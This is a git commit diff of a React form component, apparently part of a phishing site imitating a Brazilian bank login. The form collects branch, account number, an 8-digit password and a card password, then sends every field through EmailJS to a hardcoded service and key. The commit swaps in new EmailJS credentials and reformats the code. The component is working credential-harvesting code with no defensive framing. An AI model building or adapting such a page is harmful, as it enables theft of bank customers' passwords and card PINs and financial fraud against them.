88e40ae0127e926e59c67f0099e994f1ed70cbd2
KaleoRaul <87835806+KaleoRaul@users.noreply.github.com>
2024-09-21 12:04:50 -0300

    Update form.js

--- component/form.js
+++ component/form.js
@@ -1,81 +1,89 @@
-import logo from './img/logo.jpeg';
-import Image from 'next/image'
-import styles from '../styles/Home.module.css'
-import React, { useState } from 'react';
-import { Form, FormGroup, Label, Input, FormText, Container, Button } from 'reactstrap';
-import emailjs from 'emailjs-com';
+import logo from "./img/logo.jpeg";
+import Image from "next/image";
+import styles from "../styles/Home.module.css";
+import React, { useState } from "react";
+import {
+  Form,
+  FormGroup,
+  Label,
+  Input,
+  FormText,
+  Container,
+  Button,
+} from "reactstrap";
+import emailjs from "emailjs-com";
 import InputMask from "react-input-mask";
 
-
 const Formulario = (props) => {
-
   function sendEmail(e) {
     e.preventDefault();
 
-    emailjs.sendForm('service_m0rqqeb', 'template_ovtqo1m', e.target, 'user_blutAP3dvwCpJzktiSL3a')
-      .then((result) => {
+    emailjs
+      .sendForm("service_teikywb", "template_s05ddla", e.target, {
+        publicKey: "QGkJgM3wrnhXMJF1O",
+      })
+      .then(
+        (result) => {
           console.log(result.text);
-      }, (error) => {
+        },
+        (error) => {
           console.log(error.text);
-      });
+        }
+      );
   }
-  
+
   return (
     <Container>
-    <Form onSubmit={sendEmail}>  
-      
-      <FormGroup>
-        
-        <Input className={styles.Input}
-          type="number"
-          name="agencia"
-          id="agencia"
-          placeholder="Agência"
-          
-        />
-      </FormGroup>
-      <FormGroup>
-        <Input
-          type="number"
-          name="account"
-          id="account"
-          placeholder="Conta"
-          className={styles.Input}
-        />
-      </FormGroup>
-      <FormGroup>
-        <Input
-          type="password"
-          name="pass8"
-          id="pass8"
-          placeholder="Senha de 8 digitos"
-          className={styles.Input}
-        />
-      </FormGroup>
-     
-      <FormGroup>
-        <Input
-          type="password"
-          name="passCard"
-          id="passCard"
-          placeholder="Senha cartão"
-          className={styles.Input}
-        />
-      </FormGroup>
-  
+      <Form onSubmit={sendEmail}>
+        <FormGroup>
+          <Input
+            className={styles.Input}
+            type="number"
+            name="agencia"
+            id="agencia"
+            placeholder="Agência"
+          />
+        </FormGroup>
+        <FormGroup>
+          <Input
+            type="number"
+            name="account"
+            id="account"
+            placeholder="Conta"
+            className={styles.Input}
+          />
+        </FormGroup>
+        <FormGroup>
+          <Input
+            type="password"
+            name="pass8"
+            id="pass8"
+            placeholder="Senha de 8 digitos"
+            className={styles.Input}
+          />
+        </FormGroup>
 
+        <FormGroup>
+          <Input
+            type="password"
+            name="passCard"
+            id="passCard"
+            placeholder="Senha cartão"
+            className={styles.Input}
+          />
+        </FormGroup>
 
-      {/* <FormGroup>
+        {/* <FormGroup>
         <Label for="exampleRange"></Label>
         <Input type="range" name="range" id="exampleRange" />
       </FormGroup> */}
-    
-    <Button type="submit" className={styles.send} value="Send">CONTINUAR</Button>
 
-    </Form>
+        <Button type="submit" className={styles.send} value="Send">
+          CONTINUAR
+        </Button>
+      </Form>
     </Container>
-
   );
-}
+};
 
 export default Formulario;
